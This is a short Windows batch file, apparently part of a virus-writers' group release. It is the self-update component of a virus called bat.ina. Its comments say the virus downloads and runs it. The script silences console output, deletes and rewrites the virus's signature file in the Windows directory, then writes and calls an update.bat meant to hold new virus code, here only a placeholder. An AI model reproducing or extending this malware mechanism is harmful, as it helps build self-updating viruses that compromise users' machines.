:: bat.ina update-file
:: by philet0ast3r [rRlf]
:: if downloaded by bat.ina, this file gets executed as c:\updatecheck.bat

@echo off
ctty nul
del %winbootdir%\anitab1a.sig
:: this is the signature-file of the original virus
:: newer versions would delete all known signature-files

if exist %winbootdir%\*.sig goto end
:: if there's nevertheless a .sig-file, it means there's already a newer version installed
:: (as this is only proof of concept, there will probably be no new version)

echo this file is important>%winbootdir%\anitab1a.sig
:: the running version writes its signature-file

echo @echo off>ud
echo echo (this could be some new code)>>ud
echo :end>>ud
move ud %winbootdir%\update.bat
:: this is now the code of the new virus
:: if it is in fact a new version, it gets installed
:: (as said before, there will probably be no updates,
:: so this contains no code, but is just an example)

call %winbootdir%\update.bat
:end
